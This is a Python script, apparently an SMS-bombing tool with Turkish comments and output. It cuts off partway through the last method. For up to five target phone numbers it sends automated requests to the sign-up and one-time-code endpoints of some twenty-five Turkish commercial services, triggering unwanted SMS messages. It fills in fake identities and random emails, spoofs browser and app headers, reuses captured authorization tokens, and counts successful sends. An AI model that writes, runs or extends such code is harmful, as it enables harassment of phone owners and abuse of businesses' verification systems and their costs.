import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
from time import sleep

class SendSms():
    adet = 0
    toplam_sms = 1
    
   
    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):
        self.phone = str(phone)
        self.phone2 = str(phone2)
        self.phone3 = str(phone3)
        self.phone4 = str(phone4)
        self.phone5 = str(phone5)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
            
    
    
        
    #wmf.com.tr
    def Wmf(self):        
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                    "confirm": "true",
                    "date_of_birth": "1956-03-01",
                    "email": self.mail,
                    "email_allowed": "true",
                    "first_name": "Memati",
                    "gender": "male",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "phone": f"0{numara}"
                })
                    if wmf.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
         
    
    #istegelsin.com
    def IsteGelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(numara)}}
                    r = requests.post("https://prod.fasapi.net:443/",  json=json)
                    if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #bim
    def Bim(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})
                    if bim.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
        
    #ceptesok.com
    def Sok(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
                    if len(r.json()["meta"]["messages"]["success"]) != 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
 

            
    #a101.com.tr
    def A101(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.a101.com.tr:443/users/otp-login/"
                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}
                    r = requests.post(url,data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #englishhome.com
    def Englishhome(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                    if home.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #sakasu.com.tr
    def Sakasu(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"phone": numara}
                    su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                    if su.json()["status"] == "ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
 
    #bineq.tech
    def Bineq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    bineq = requests.post(url, headers=headers)
                    if bineq.json()["IsSuccess"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineqapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineqapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #superpedestrian.com
    def Link(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
                    json={"phone_number": f"+90{numara}"}
                    link = requests.post(url, json=json)
                    if link.json()["detail"] == "Ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> consumer-auth.linkfleet.de "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> consumer-auth.linkfleet.de "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue

            
    #dgnonline.com
    def Dgn(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": numara}
                    dgn = requests.post(url, headers=headers, data=data)
                    if dgn.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
   
             
    #defacto.com.tr
    def Defacto(self):
           
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    data = {"mobilePhone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["Data"]["IsSMSSend"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #mopas.com.tr
    def Mopas(self):          
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
 
    
    #boyner.com
    def Boyner(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
                    json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["Success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #watsons.com.tr
    def Watsons(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
                    json={"countryCode": "TR", "phoneNumber": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.status_code == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #buyursungelsin.com
    def Buyur(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://app.buyursungelsin.com:443/api/customer/form/check"
                    headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
                    data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #idealdata.com.tr
    def Osmanlideal(self):


        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #pinarsu.com.tr
    def Pinar(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
                    headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
                    json={"MobilePhone": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.text == "true":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pinarsumobileservice.yasar.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #suiste.com
    def Suiste(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://suiste.com:443/api/auth/code"
                    headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
                    data = {"action": "register", "gsm": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if r.json()["code"] == "common.success":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #hayatsu.com.tr
    def Hayat(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
                    json={"mobilePhoneNumber": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["IsSuccessful"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #pisir.com
    def Pisir(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": numara})
                    if r.json()["ok"] == "1":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
                
    
 

    #ikinciyeni.com
    def IkinciYeni(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
                    json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["isSucceed"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> apigw.ikinciyeni.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #terrapizza.com.tr
    def Terra(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.terrapizza.com.tr:443/api/v1/customers"
                    json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(numara), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
                    r = requests.post(url,  json=json)
                    if (r.status_code) == 201:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.terrapizza.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

            
            
    #ipragaz.com.tr
    def IpraGaz(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
                    json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}
                    r = requests.post(url, json=json)
                    if (r.json()["phoneNumber"]) == str(numara):
